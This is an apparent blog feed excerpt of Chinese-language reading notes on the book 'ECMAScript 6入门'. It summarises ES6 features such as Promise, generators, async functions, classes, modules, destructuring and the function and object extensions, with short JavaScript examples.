<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">getJSON(<span class="string">"/posts.json"</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">json</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> json.post <span class="comment">// 这里返回的结果作为参数传给下一个 then 调用</span></div><div class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">post</span>) </span>&#123;</div><div class="line">  <span class="comment">// 如果 post 是另外一个 promise，则会等待该 promise 决议</span></div><div class="line">&#125;)</div></pre></td></tr></table></figure>
<ul>
<li><p><code>Promise.all()</code> 方法用于多个 promise 实例</p>
<ul>
<li>全部 promise 都变成 resolve，才返回 resolve</li>
<li>只要有一个 reject，返回第一个 reject 那个</li>
</ul>
</li>
<li><p><code>Promise.race()</code>  返回最先被决议的那个 promise</p>
</li>
<li><code>Promise.resolve()</code> 方法会将一个普通对象转换成 Promise 对象<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Promise</span>.resolve(<span class="string">'foo'</span>)</div><div class="line"><span class="comment">// 等价于</span></div><div class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> resolve(<span class="string">'foo'</span>))</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="Iterator-和-for…of-循环"><a href="#Iterator-和-for…of-循环" class="headerlink" title="Iterator 和 for…of 循环"></a>Iterator 和 for…of 循环</h2><blockquote>
<p><code>Iterator</code> 的作用有三个：一是为各种数据结构，提供一个统一的、简便的访问接口；二是使得数据结构的成员能够按某种次序排列；三是 ES6 创造了一种新的遍历命令 <code>for...of</code> 循环，Iterator 接口主要供 <code>for...of</code> 消费</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> it = makeIterator([<span class="string">'a'</span>, <span class="string">'b'</span>]);</div><div class="line"></div><div class="line">it.next() <span class="comment">// &#123; value: "a", done: false &#125;</span></div><div class="line">it.next() <span class="comment">// &#123; value: "b", done: false &#125;</span></div><div class="line">it.next() <span class="comment">// &#123; value: undefined, done: true &#125;</span></div><div class="line"><span class="comment">// 手动模拟一个迭代器</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeIterator</span>(<span class="params">array</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> nextIndex = <span class="number">0</span>;</div><div class="line">  <span class="keyword">return</span> &#123;</div><div class="line">    <span class="attr">next</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">      <span class="keyword">return</span> nextIndex &lt; array.length ?</div><div class="line">        &#123;<span class="attr">value</span>: array[nextIndex++], <span class="attr">done</span>: <span class="literal">false</span>&#125; :</div><div class="line">        &#123;<span class="attr">value</span>: <span class="literal">undefined</span>, <span class="attr">done</span>: <span class="literal">true</span>&#125;;</div><div class="line">    &#125;</div><div class="line">  &#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>在ES6中，有三类数据结构原生具备 Iterator 接口：数组、某些类似数组的对象、Set 和 Map 结构</li>
</ul>
<h2 id="Generator"><a href="#Generator" class="headerlink" title="Generator"></a>Generator</h2><blockquote>
<p>用 Generator 函数，返回一个遍历器对象，代表 Generator 函数的内部指针。以后，每次调用遍历器对象的 <code>next</code> 方法，就会返回一个有着 <code>value</code> 和 <code>done</code> 两个属性的对象。<code>value</code> 属性表示当前的内部状态的值，是 <code>yield</code> 语句后面那个表达式的值；<code>done</code>属性是一个布尔值，表示是否遍历结束</p>
</blockquote>
<ul>
<li>Generator 函数本质上还是函数，但这个函数可以分段执行返回</li>
<li>Generator 函数可以不用 <code>yield</code> 语句，这时就变成了一个单纯的暂缓执行函数。但 <code>yield</code> 语句只能用在 Generator 函数中</li>
<li>Generator 函数是 ES6 新增的底层实现，跟 Promise 不同</li>
<li><p>使普通对象具备迭代器接口</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> myIterable = &#123;&#125;;</div><div class="line">myIterable[<span class="built_in">Symbol</span>.iterator] = <span class="function"><span class="keyword">function</span>* (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">yield</span> <span class="number">1</span>;</div><div class="line">  <span class="keyword">yield</span> <span class="number">2</span>;</div><div class="line">  <span class="keyword">yield</span> <span class="number">3</span>;</div><div class="line">&#125;;</div><div class="line"><span class="comment">//</span></div><div class="line">[...myIterable] <span class="comment">// [1, 2, 3]</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>yield</code> 句本身没有返回值，或者说总是返回 <code>undefined</code>。<code>next</code> 方法可以带一个参数，该参数就会被当作上一个 <code>yield</code> 语句的返回值</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span>* <span class="title">f</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; <span class="literal">true</span>; i++) &#123;</div><div class="line">    <span class="keyword">var</span> reset = <span class="keyword">yield</span> i;</div><div class="line">    <span class="keyword">if</span>(reset) &#123; i = <span class="number">-1</span>; &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 可以在 Generator 函数运行的不同阶段，从外部向内部注入不同的值，从而调整函数行为</span></div><div class="line"><span class="keyword">var</span> g = f();</div><div class="line">g.next() <span class="comment">// &#123; value: 0, done: false &#125;</span></div><div class="line">g.next() <span class="comment">// &#123; value: 1, done: false &#125;</span></div><div class="line">g.next(<span class="literal">true</span>) <span class="comment">// &#123; value: 0, done: false &#125;</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>for...of</code> 循环可以自动遍历 Generator 函数时生成的 Iterator 对象，且此时不再需要调用 <code>next</code> 方法</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> *<span class="title">foo</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">yield</span> <span class="number">1</span>;</div><div class="line">  <span class="keyword">yield</span> <span class="number">2</span>;</div><div class="line">  <span class="keyword">yield</span> <span class="number">3</span>;</div><div class="line">  <span class="keyword">yield</span> <span class="number">4</span>;</div><div class="line">  <span class="keyword">yield</span> <span class="number">5</span>;</div><div class="line">  <span class="keyword">return</span> <span class="number">6</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">for</span> (<span class="keyword">let</span> v <span class="keyword">of</span> foo()) &#123;</div><div class="line">  <span class="built_in">console</span>.log(v);</div><div class="line">&#125;</div><div class="line"><span class="comment">// 1 2 3 4 5 不包含返回对象</span></div></pre></td></tr></table></figure>
</li>
<li><p>配合 <code>try...catch</code> 和 <code>Generator.throw()</code> 方法，可以方便地根据需要在函数内外捕获错误</p>
</li>
<li><code>Generator.return()</code> 方法可以返回值并停止迭代</li>
<li><code>yield*</code>后面的 Generator 函数（没有 return 语句时），不过是 <code>for...of</code> 的一种简写形式，完全可以用后者替代前者。反之，则需要用 <code>var value = yield* iterator</code> 的形式获取 <code>return</code> 语句的值</li>
<li>任何数据结构只要有 Iterator 接口，就可以被 <code>yield*</code> 遍历</li>
<li>其返回的 Promise 对象的只在所有异步状态都完成后才决议（除非提前 return 或抛出错误），非常类似 Promise.all</li>
<li>使用 Generator 包装一个对象<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span>* <span class="title">objectEntries</span>(<span class="params">obj</span>) </span>&#123;</div><div class="line">  <span class="keyword">let</span> propKeys = <span class="built_in">Reflect</span>.ownKeys(obj)</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> propKey <span class="keyword">of</span> propKeys) &#123;</div><div class="line">    <span class="keyword">yield</span> [propKey, obj[propKey]]</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">let</span> jane = &#123; <span class="attr">first</span>: <span class="string">'Jane'</span>, <span class="attr">last</span>: <span class="string">'Doe'</span> &#125;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [key, value] <span class="keyword">of</span> objectEntries(jane)) &#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;key&#125;</span>: <span class="subst">$&#123;value&#125;</span>`</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="async-函数（ES2017）"><a href="#async-函数（ES2017）" class="headerlink" title="async 函数（ES2017）"></a>async 函数（ES2017）</h2><blockquote>
<p>是 Generator 函数的语法糖</p>
</blockquote>
<ul>
<li>自带执行器，因此不用手动调用 <code>next()</code>，可以看作是多个异步操作包装成的 Promise 对象，因此下一步通常是调用 <code>then</code> 方法进行处理，本质上等于把 Generator 和它的执行期封装在一个函数中</li>
<li>具备五种定义方法<ul>
<li>函数声明</li>
<li>函数表达式</li>
<li>对象方法</li>
<li>类</li>
<li>箭头函数</li>
</ul>
</li>
<li><code>await</code> 命令后面一定是一个 Promise 对象（自动包装）</li>
<li>为了能方便捕获错误，最好讲 <code>await</code> 操作放在 <code>try...catch</code> 中<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">try</span> &#123;</div><div class="line">    <span class="keyword">await</span> somethingThatReturnsAPromise()</div><div class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</div><div class="line">    <span class="built_in">console</span>.log(err)</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h2><ul>
<li><p>基本应用</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// ES5</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name, age</span>) </span>&#123;</div><div class="line">	<span class="keyword">this</span>.name = name</div><div class="line">	<span class="keyword">this</span>.age = age</div><div class="line">&#125;</div><div class="line">Person.prototype.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">	<span class="keyword">return</span> <span class="keyword">this</span>.name</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// ES6</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</div><div class="line">	<span class="keyword">constructor</span> (name, age) &#123;</div><div class="line">		<span class="keyword">this</span>.name = name</div><div class="line">		<span class="keyword">this</span>.age = age</div><div class="line">	&#125;</div><div class="line">	<span class="comment">//</span></div><div class="line">	getName () &#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.name</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p><code>Class</code> 必须用 <code>new</code> 调用，否则报错，同时不存在变量提升</p>
</li>
<li>与ES5不同的地方是，<code>Class</code> 定义的方法是不可枚举的</li>
<li><code>constructor</code> 方法是类的默认方法，如果不指定，则默认添加一个空方法</li>
<li><code>Class</code> 中默认就是严格模式</li>
<li>类之间通过 <code>extends</code> 关键字实现继承<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// ColorPoint 类，该类通过 extends 关键字，继承了 Point 类的所有属性和方法</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ColorPoint</span> <span class="keyword">extends</span> <span class="title">Point</span> </span>&#123;&#125; <span class="comment">// 这里相当于复制</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ColorPoint</span> <span class="keyword">extends</span> <span class="title">Point</span> </span>&#123;</div><div class="line">	<span class="comment">// 子类必须在 constructor 方法中调用 super 方法，否则新建实例时会报错。这是因为子类没有自己的 this 对象，而是继承父类的 this 对象，然后对其进行加工</span></div><div class="line">  <span class="keyword">constructor</span>(x, y, color) &#123;</div><div class="line">    <span class="keyword">super</span>(x, y); <span class="comment">// 调用父类的 constructor(x, y)</span></div><div class="line">    <span class="keyword">this</span>.color = color;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  toString() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.color + <span class="string">' '</span> + <span class="keyword">super</span>.toString(); <span class="comment">// 调用父类的 toString()</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="Module"><a href="#Module" class="headerlink" title="Module"></a>Module</h2><ul>
<li>CommonJS 与 ES6 的区别<ul>
<li>CommonJS 先生成对象再读取其中的方法，运行时加载，无法静态优化；ES6 模块不是对象，编译时加载，可实现静态优化</li>
<li>CommonJS 输出的是值的缓存，不存在动态更新；ES6 模块输出的是值的引用</li>
</ul>
</li>
<li>ES6 中的模块自动采用严格模式</li>
<li><code>export</code> 命令，输出模块的变量（否则外部无法读取），该命令不能出现在块作用域中</li>
<li><code>import</code> 命令加载模块并读取其中变量，该命令有提升作用，自动提升到整个模块头部优先执行，该命令不能出现在块作用域中</li>
<li><code>import</code> 是静态执行的，所以不能使用表达式和变量这些运行时语法，该命令是 Singleton 模式</li>
<li>使用默认输出时，<code>import</code>语句无需大括号</li>
<li>浏览器中使用模块，该模块默认为延迟脚本<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"module"</span> <span class="attr">src</span>=<span class="string">"foo.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;下半部分，主要考量了全新的异步模式 Promise 和 Generator 以及它们的语法糖 async。当然，还有超级好用的的模块实现，以及让人头大的的类，这里建议配合&lt;a href=&quot;https://item.jd.com/12030814.html&quot;&gt;《你不知道的JavaScript（中）》&lt;/a&gt;的第二部分反复阅读，理解 JavaScript 强大的异步实现&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/ECMAScript6入门.jpg&quot; alt=&quot;ECMAScript6入门&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《ECMAScript 6入门》阅读笔记（上）</title>
    <link href="https://github.com/Hyifu/2017/03/08/%E3%80%8AECMAScript%206%20%E5%85%A5%E9%97%A8%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <id>https://github.com/Hyifu/2017/03/08/《ECMAScript 6 入门》阅读笔记（上）/</id>
    <published>2017-03-07T16:00:00.000Z</published>
    <updated>2017-04-21T15:08:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>入门ES6最佳选择，读完收获颇多。但关注点主要还是放在一些新的编程模式，比如 Promise 和 Generator 带来的对前端编程逻辑的巨大改变（甚至我认为， ES6中 Promise和 Generator 才是主菜，其他不过是饭前甜点罢了）。除此以外，很多以前在 ES5 中蛋疼的实现有了更优雅的实现，比如块作用域和变量提升，函数中万变的 this 等。很多东西碍于实现，在前端中可能并不会全部用上，但是至少，配合 polyfill 和打包工具，让我们在工程化中有了更进一步的统一</p>
<p><img src="/images/ECMAScript6入门.jpg" alt="ECMAScript6入门"></p>
<a id="more"></a>
<h2 id="let-和-const-命令"><a href="#let-和-const-命令" class="headerlink" title="let 和 const 命令 !"></a>let 和 const 命令 !</h2><ul>
<li>不存在变量提升</li>
<li>存在块级作用域</li>
<li>暂时性死区 =&gt; （<code>typeof</code> 操作符不再百分百安全）</li>
<li>不允许重复声明</li>
<li>安全起见，不在作用域块中声明函数（浏览器实现）</li>
<li><code>const</code> 声明后不允许改变（对于引用类型，指地址不变）</li>
<li>ES6 中六种声明变量语法（<code>var</code>、<code>let</code> 、<code>const</code> 、<code>function</code> 、<code>import</code> 、<code>class</code> ）</li>
<li><code>let</code> 和 <code>const</code> 声明的全局变量不再是顶级对象的属性</li>
</ul>
<h2 id="变量的解构赋值"><a href="#变量的解构赋值" class="headerlink" title="变量的解构赋值 !"></a>变量的解构赋值 !</h2><ul>
<li>数组：<code>let [a, b, c] = [1, 2, 3]</code></li>
<li>对象：<code>let { bar, foo } = { foo: &#39;aaa&#39;, bar: &#39;bbb&#39; }; // foo =&gt; &quot;aaa&quot;</code></li>
<li>等号邮编必须具备迭代器接口（如数组、对象）</li>
<li>允许指定默认值：<code>let [x, y = &#39;b&#39;] = [&#39;a&#39;]; // x =&gt; &#39;a&#39;, y =&gt; &#39;b&#39;</code></li>
<li>默认值的判断使用严格等于 <code>undefined</code>，如果默认值是一个表达式或函数，则进行惰性求值</li>
<li>字符串的解构赋值：<code>const [a, b, c, d, e] = &#39;hello&#39;</code></li>
<li>如果等号右边是不是对象或数组，则先转为对象，而 <code>undefined</code> 和 <code>null</code> 无法转为对象导致报错</li>
</ul>
<h2 id="字符串的扩展"><a href="#字符串的扩展" class="headerlink" title="字符串的扩展 !"></a>字符串的扩展 !</h2><ul>
<li><p>直接遍历方法 <code>for...of</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">of</span> <span class="string">'foo'</span>) &#123;</div><div class="line">  <span class="built_in">console</span>.log(key) <span class="comment">// 'f'，'o'，'o'</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p><code>includes()</code>，<code>startsWith()</code>，<code>endsWith()</code></p>
<ul>
<li><code>includes()</code>：返回布尔值，表示是否找到了参数字符串</li>
<li><code>startsWith()</code>：返回布尔值，表示参数字符串是否在源字符串的头部</li>
<li><code>endsWith()</code>：返回布尔值，表示参数字符串是否在源字符串的尾部</li>
</ul>
</li>
<li><p><code>repeat(n)</code> 返回一个新字符串，表示将原字符串重复n次</p>
</li>
<li><code>padStart()</code>，<code>padEnd()</code> 字符串不够指定长度，会在头部或尾部补全</li>
<li>模板字符串 <code>foo ${fn()} bar-${name}</code></li>
</ul>
<h2 id="数值的扩展"><a href="#数值的扩展" class="headerlink" title="数值的扩展"></a>数值的扩展</h2><ul>
<li><code>Number.isFinite()</code>，<code>Number.isNaN()</code> 只对数值有效，不转换</li>
<li>全局方法 <code>parseInt()</code> 和 <code>parseFloat()</code> 移植到了 <code>Number</code> 对象上</li>
<li><code>Number.isInteger()</code> 用来判断一个值是否为整数</li>
<li>新增一个极小的常量 <code>Number.EPSILON</code>，一般用来判断误差精度</li>
<li><code>Math.trunc(number)</code> 方法用于去除一个数的小数部分，返回整数部分</li>
<li><code>Math.sign(number)</code> 方法用来判断一个数到底是正数、负数、还是零</li>
<li>指数运算符<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">2</span> ** <span class="number">2</span> <span class="comment">// 4</span></div><div class="line"><span class="number">2</span> ** <span class="number">3</span> <span class="comment">// 8</span></div><div class="line">a **= <span class="number">2</span> <span class="comment">// 等同于 a = a * a;</span></div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="数组的扩展"><a href="#数组的扩展" class="headerlink" title="数组的扩展"></a>数组的扩展</h2><ul>
<li><code>Array.from(arrayLike, fn, scope)</code> 将类数组（具备 <code>Iterator</code> 接口，即具有 <code>length</code> 属性）对象转为真正的数组，类似 <code>Array.prototype.slice.call(arrayLike)</code></li>
<li><code>Array.of</code> 方法用于将一组值，转换为数组 =&gt; 弥补数组构造函数 <code>Array()</code> 的不足。因为参数个数的不同，会导致 <code>Array()</code> 的行为有差异</li>
<li><code>copyWithin</code> 方法，在当前数组内部，将指定位置的成员复制到其他位置（会覆盖原有成员），然后返回当前数组<br><code>[NaN].indexOf(NaN) // -1</code>，而 <code>find()</code> 和 <code>findIndex()</code> 则可以找到 <code>NaN</code></li>
<li><code>fill(times, start, end)</code> 方法使用给定值，填充一个数组</li>
<li><code>entries()</code>，<code>keys()</code>，<code>values()</code> 分别遍历键值对、键名、键值</li>
<li>ES6 明确将稀疏数组的空位转为 <code>undefined</code>（ES5的迭代器方法则忽略空位）</li>
</ul>
<h2 id="函数的扩展"><a href="#函数的扩展" class="headerlink" title="函数的扩展 !"></a>函数的扩展 !</h2><h4 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h4><ul>
<li>默认值 =&gt; <code>function log(x, y = &#39;World&#39;) {}</code>（参数变量是默认声明的，所以不能用 <code>let</code> 或 <code>const</code> 再次声明，也不能有同名参数）</li>
<li>如果参数默认值是变量，那么参数就不是传值的，而是每次都重新计算默认值表达式的值</li>
<li><p>双重默认值配合解构赋值</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span> (<span class="params">url, &#123; body = <span class="string">''</span>, method = <span class="string">'GET'</span> &#125; = &#123;&#125;</span>) </span>&#123;</div><div class="line">	<span class="built_in">console</span>.log(method)</div><div class="line">&#125;</div><div class="line">fetch(<span class="string">'http://example.com'</span>) <span class="comment">// 可以不传入第二个参数同时有默认值</span></div></pre></td></tr></table></figure>
</li>
<li><p>定义默认值的参数应该是尾参数（不然没法省略，自然用不上默认值）</p>
</li>
<li>函数的 <code>length</code> 属性不包含有默认值的形参（也不包含rest参数）<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 如果设置了默认值的参数不是尾参数，那么 length 属性也不再计入后面的参数了</span></div><div class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">a = <span class="number">0</span>, b, c</span>) </span>&#123;&#125;).length <span class="comment">// 0</span></div><div class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">a, b = <span class="number">1</span>, c</span>) </span>&#123;&#125;).length <span class="comment">// 1</span></div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="rest参数"><a href="#rest参数" class="headerlink" title="rest参数"></a>rest参数</h4><ul>
<li><code>...rest</code> 参数可以替代 <code>arguments</code> 对象，是数组对象，可以直接使用数组方法</li>
<li><code>...rest</code> 参数后面不能有其他参数，否则报错</li>
<li>函数的 <code>length</code> 属性不包含 <code>...rest</code> 参数</li>
</ul>
<h4 id="扩展运算符"><a href="#扩展运算符" class="headerlink" title="扩展运算符"></a>扩展运算符</h4><ul>
<li><code>...</code> 扩展运算符 =&gt; 将数组转化为逗号分离的参数，类似 <code>...rest</code> 参数的逆运算</li>
<li>合并数组：<code>[1, 2, ...array]</code></li>
<li>将字符串转成数组：<code>[...&#39;hello&#39;] // [ &quot;h&quot;, &quot;e&quot;, &quot;l&quot;, &quot;l&quot;, &quot;o&quot; ]</code></li>
</ul>
<h4 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> f = <span class="function"><span class="params">v</span> =&gt;</span> v;</div><div class="line"><span class="keyword">var</span> g = <span class="function"><span class="params">()</span> =&gt;</span> <span class="number">5</span>;</div><div class="line"><span class="comment">// 上面的箭头函数等同于</span></div><div class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params">v</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> v;</div><div class="line">&#125;;</div><div class="line"><span class="keyword">var</span> g = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="number">5</span> &#125;;</div></pre></td></tr></table></figure>
<ul>
<li>如果箭头函数直接返回一个对象，必须在对象外面加上括号 <code>var getTempItem = id =&gt; ({ id: id, name: &quot;Temp&quot; })</code></li>
<li><code>this</code> 对象指向父级，不可以用 <code>new</code> 调用，没有 <code>arguments</code> 对象，不能使用 <code>yield</code>，（实际上并没有自己的 <code>this</code>）</li>
<li>箭头函数没有自己的 <code>this</code>，所以当然也就不能用 <code>call()</code>、<code>apply()</code>、<code>bind()</code> 这些方法去改变 <code>this</code> 的指向</li>
<li>多重嵌套函数（难点）</li>
<li><p>尾调用优化（ES6 的尾调用优化只在严格模式下开启）</p>
<blockquote>
<p>尾调用（Tail Call）指某个函数的最后一步是调用另一个函数<br><code>function f(x) { return g(x) }</code><br>闭包一般是没有做到尾调用优化的，因为定义上不允许</p>
</blockquote>
</li>
<li><p>尾递归 =&gt; 尾调用自身，只要使用尾递归，永远不会发生“栈溢出”（stack overflow），函数编程可用递归实现循环（递归本质上是一种循环操作）</p>
<ul>
<li>阶乘函数优化</li>
<li>斐波那契数列优化</li>
<li>柯里化和参数默认值</li>
</ul>
</li>
<li>手动实现尾递归优化（核心是减少调用栈） =&gt; 使用循环代替递归<ul>
<li>蹦床函数</li>
</ul>
</li>
</ul>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul>
<li>只要函数参数使用了默认值、解构赋值、或者扩展运算符，那么函数内部就不能显式设定为严格模式，否则会报错</li>
<li>如果将一个匿名函数赋值给一个变量，ES5 的 name 属性，会返回空字符串，而 ES6 的 name 属性会返回实际的函数名</li>
<li>尾调用 =&gt; 某个函数的最后一步是调用另一个函数</li>
<li>函数调用自身，称为递归。如果尾调用自身，就称为尾递归</li>
</ul>
<h2 id="对象的扩展"><a href="#对象的扩展" class="headerlink" title="对象的扩展 !"></a>对象的扩展 !</h2><ul>
<li><p>属性的简洁表示法 =&gt; 简洁写法的属性名总是字符串</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> birth = <span class="string">'2000/01/01'</span>;</div><div class="line"><span class="keyword">var</span> Person = &#123;</div><div class="line">  <span class="attr">name</span>: <span class="string">'张三'</span>,</div><div class="line">  <span class="comment">//等同于 birth: birth</span></div><div class="line">  birth,</div><div class="line">  <span class="comment">// 等同于 hello: function ()...</span></div><div class="line">  hello() &#123;</div><div class="line">	  <span class="built_in">console</span>.log(<span class="string">'我的名字是'</span>, <span class="keyword">this</span>.name);</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
</li>
<li><p><code>Object.is()</code> 类似全等符 <code>===</code> ，但 <code>+0</code> 不等于 <code>-0</code>，<code>NaN</code> 等于自身 =&gt; <code>Object.is(&#39;foo&#39;, &#39;foo&#39;)</code></p>
</li>
<li><code>Object.assign</code> 方法用于对象的合并，将源对象的所有自身可枚举属性，复制到目标对象 =&gt; <code>Object.assign(target, source1, source2)</code>，浅复制</li>
<li>属性的遍历<ul>
<li><code>for...in</code> 循环遍历对象自身的和继承的可枚举属性（不含 Symbol 属性）</li>
<li><code>Object.keys</code> 返回一个数组，包括对象自身的（不含继承的）所有可枚举属性（不含 Symbol 属性）</li>
<li><code>Object.getOwnPropertyNames</code> 返回一个数组，包含对象自身的所有属性（不含 Symbol 属性，但是包括不可枚举属性）</li>
